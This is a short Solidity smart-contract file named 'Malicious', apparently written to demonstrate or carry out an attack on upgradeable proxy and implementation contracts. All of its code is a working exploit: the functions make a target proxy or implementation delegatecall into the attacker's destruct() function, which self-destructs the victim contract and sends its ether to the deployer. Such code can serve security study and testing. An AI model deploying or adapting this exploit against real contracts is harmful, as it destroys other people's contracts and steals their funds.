// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

interface IImpl {
    function callContract(address a, bytes calldata _calldata) external payable  returns (bytes memory);
    function delegatecallContract(address a, bytes calldata _calldata) external payable  returns (bytes memory);
}

/// The implementation malicious contract to exploit implementation
contract Malicious {
    address payable private attacker;

    constructor(){
      attacker = payable(msg.sender);
    }

  
    /*
      * Function that call the exploit in implementation contract
      */
    function attackImpl(address _impl) external {
      bytes memory data = abi.encodeWithSignature("destruct()");
      IImpl(_impl).delegatecallContract(address(this),data);
    }

    function attackProxy(address _proxy) external {
      bytes memory data = abi.encodeWithSignature("delegatecallContract(address,bytes)", address(this), abi.encodeWithSignature("destruct()"));
      _proxy.call(data);
    }

    function attack2(address _imp) external {
      bytes memory data = abi.encodeWithSignature("delegatecallContract(address,bytes)", address(this), abi.encodeWithSignature("destruct()"));
      _imp.delegatecall(data);
    }

    /*
    * Function to be executed in the context of implementation contract
    */
    function destruct() external {
        selfdestruct(attacker);
    }
}
